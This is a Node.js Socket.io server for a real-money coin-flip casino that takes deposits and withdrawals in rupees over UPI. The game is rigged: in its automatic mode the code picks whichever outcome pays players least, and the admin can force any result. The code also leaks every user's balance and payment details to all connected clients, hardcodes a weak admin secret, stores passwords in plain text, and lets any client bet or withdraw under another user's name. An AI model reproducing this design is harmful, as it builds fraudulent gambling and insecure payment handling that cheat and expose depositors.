const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" },
    transports: ['polling', 'websocket'] // Render fallback compatibility
});

app.use(express.static(path.join(__dirname, 'public')));

// In-Memory Database (Replace with MongoDB/Postgres for production)
const users = {}; 
let deposits = [];
let withdrawals = [];
let roundHistory = [];
let currentBets = [];
let betFeed = [];

// Admin State
const ADMIN_SECRET = 'admin123'; // Change in production
let adminState = {
    totalVolume: 0,
    houseProfit: 0,
    forcedOutcome: 'AUTO', // HEADS, TAILS, or AUTO
    activeUpi: 'casino@upi'
};

// Game Loop State
let timeRemaining = 30;
let isSpinning = false;
let currentRoundId = Date.now();

// Utility: Get IST Time
function getISTTime() {
    return new Date().toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true });
}

// 30-Second Game Loop Engine
setInterval(() => {
    if (isSpinning) return;
    
    timeRemaining--;
    
    io.emit('time_sync', {
        roundId: currentRoundId,
        secondsRemaining: Math.max(0, timeRemaining),
        istTime: getISTTime()
    });

    if (timeRemaining <= 0) {
        processRound();
    }
}, 1000);

function processRound() {
    isSpinning = true;
    
    // Determine Outcome
    let outcome = 'HEADS';
    if (adminState.forcedOutcome === 'AUTO') {
        // Liability Calculation
        let headsLiability = 0;
        let tailsLiability = 0;
        currentBets.forEach(b => {
            if (b.choice === 'HEADS') headsLiability += b.amount * 2;
            if (b.choice === 'TAILS') tailsLiability += b.amount * 2;
        });
        // Pick outcome with lowest payout
        if (headsLiability > tailsLiability) outcome = 'TAILS';
        else if (tailsLiability > headsLiability) outcome = 'HEADS';
        else outcome = Math.random() > 0.5 ? 'HEADS' : 'TAILS';
    } else {
        outcome = adminState.forcedOutcome;
    }

    roundHistory.unshift(outcome);
    if (roundHistory.length > 20) roundHistory.pop();

    io.emit('round_result', { outcome, history: roundHistory });

    // Settle Bets
    setTimeout(() => {
        currentBets.forEach(bet => {
            const user = users[bet.username];
            if (!user) return;
            
            if (bet.choice === outcome) {
                const won = bet.amount * 2;
                user.balance += won;
                adminState.houseProfit -= won; // House loses payout
                io.to(user.socketId).emit('bet_settled', { isWin: true, amountWon: won, user });
            } else {
                io.to(user.socketId).emit('bet_settled', { isWin: false, amountWon: 0, user });
            }
            user.activeBet = 0;
        });

        // Reset Round
        currentBets = [];
        betFeed = [];
        currentRoundId = Date.now();
        timeRemaining = 30;
        isSpinning = false;
        
        io.emit('live_bet_feed', betFeed);
        broadcastAdminState();
    }, 1500); // Wait for spin animation
}

function broadcastAdminState() {
    const usersList = Object.keys(users).map(k => ({
        username: k,
        balance: users[k].balance,
        isOnline: users[k].isOnline,
        activeBet: users[k].activeBet
    }));
    io.emit('admin_state_update', { ...adminState, usersList, deposits, withdrawals });
}

io.on('connection', (socket) => {
    // Initial Sync
    socket.emit('history_update', roundHistory);
    socket.emit('live_bet_feed', betFeed);
    socket.emit('upi_changed', adminState.activeUpi);

    socket.on('user_login', ({ username, password, isSignUp }, callback) => {
        if (isSignUp) {
            if (users[username]) return callback({ success: false, msg: 'Username taken!' });
            users[username] = { password, balance: 0, isOnline: true, socketId: socket.id, activeBet: 0 };
        } else {
            if (!users[username] || users[username].password !== password) {
                return callback({ success: false, msg: 'Invalid credentials!' });
            }
            users[username].isOnline = true;
            users[username].socketId = socket.id;
        }
        socket.username = username;
        callback({ success: true, userData: users[username], adminUpi: adminState.activeUpi });
        broadcastAdminState();
    });

    socket.on('place_bet', ({ username, choice, amount }, callback) => {
        if (isSpinning || timeRemaining <= 2) return callback({ success: false, msg: 'Bets closed!' });
        if (!users[username] || users[username].balance < amount || amount <= 0) {
            return callback({ success: false, msg: 'Insufficient balance!' });
        }

        // Deduct balance instantly
        users[username].balance -= amount;
        users[username].activeBet += amount;
        adminState.totalVolume += amount;
        adminState.houseProfit += amount; // House takes bet initially

        currentBets.push({ username, choice, amount });
        betFeed.unshift(`${username} bet ₹${amount} on ${choice}`);
        if(betFeed.length > 10) betFeed.pop();

        io.emit('live_bet_feed', betFeed);
        callback({ success: true, msg: 'Bet Placed!' });
        
        // Sync user instantly
        socket.emit('user_sync', users[username]);
        broadcastAdminState();
    });

    // --- Deposits & Withdrawals ---
    socket.on('request_deposit', (data, cb) => {
        deposits.push({ id: Date.now(), uid: data.username, amount: Number(data.amount), txnId: data.txnId, status: 'PENDING' });
        broadcastAdminState();
        cb({ success: true, msg: 'Deposit request sent to Admin.' });
    });

    socket.on('request_withdrawal', (data, cb) => {
        if (users[data.username].balance < data.amount) return cb({ success: false, msg: 'Insufficient funds!' });
        users[data.username].balance -= data.amount; // Deduct immediately
        withdrawals.push({ id: Date.now(), uid: data.username, amount: Number(data.amount), upiDetails: data.upiDetails, status: 'PENDING', time: getISTTime() });
        socket.emit('user_sync', users[data.username]);
        broadcastAdminState();
        cb({ success: true, msg: 'Withdrawal requested.' });
    });

    socket.on('get_user_withdrawals', (data, cb) => {
        const history = withdrawals.filter(w => w.uid === data.username);
        cb({ success: true, history });
    });

    // --- Admin Controls ---
    socket.on('admin_login', ({ adminPassword }, cb) => {
        if (adminPassword === ADMIN_SECRET) {
            const usersList = Object.keys(users).map(k => ({
                username: k, balance: users[k].balance, isOnline: users[k].isOnline, activeBet: users[k].activeBet
            }));
            cb({ success: true, data: { ...adminState, usersList, deposits, withdrawals } });
        } else {
            cb({ success: false });
        }
    });

    socket.on('admin_update_upi', (data) => {
        if (data.adminSecret !== ADMIN_SECRET) return;
        adminState.activeUpi = data.newUpi;
        io.emit('upi_changed', adminState.activeUpi);
        broadcastAdminState();
    });

    socket.on('admin_set_mode', (data) => {
        if (data.adminSecret !== ADMIN_SECRET) return;
        adminState.forcedOutcome = data.mode;
        broadcastAdminState();
    });

    socket.on('admin_modify_wallet', (data) => {
        if (data.adminSecret !== ADMIN_SECRET || !users[data.username]) return;
        users[data.username].balance += data.amount;
        io.to(users[data.username].socketId).emit('user_sync', users[data.username]);
        broadcastAdminState();
    });

    socket.on('admin_process_deposit', (data) => {
        if (data.adminSecret !== ADMIN_SECRET) return;
        const dep = deposits.find(d => d.id === data.id);
        if (dep && dep.status === 'PENDING') {
            dep.status = data.action;
            if (data.action === 'APPROVED' && users[dep.uid]) {
                users[dep.uid].balance += dep.amount;
                io.to(users[dep.uid].socketId).emit('user_sync', users[dep.uid]);
                io.to(users[dep.uid].socketId).emit('admin_payment_notification', { title: 'Deposit Approved', message: `₹${dep.amount} added to wallet.` });
            }
        }
        broadcastAdminState();
    });

    socket.on('admin_process_withdrawal', (data) => {
        if (data.adminSecret !== ADMIN_SECRET) return;
        const wdr = withdrawals.find(w => w.id === data.id);
        if (wdr && wdr.status === 'PENDING') {
            wdr.status = data.action;
            if (data.action === 'REJECTED' && users[wdr.uid]) {
                users[wdr.uid].balance += wdr.amount; // Refund
                io.to(users[wdr.uid].socketId).emit('user_sync', users[wdr.uid]);
            }
            if (data.action === 'APPROVED' && users[wdr.uid]) {
                 io.to(users[wdr.uid].socketId).emit('admin_payment_notification', { title: 'Withdrawal Sent', message: `₹${wdr.amount} processed to your UPI.` });
            }
        }
        broadcastAdminState();
    });

    socket.on('disconnect', () => {
        if (socket.username && users[socket.username]) {
            users[socket.username].isOnline = false;
            broadcastAdminState();
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Casino Server running on port ${PORT}`));
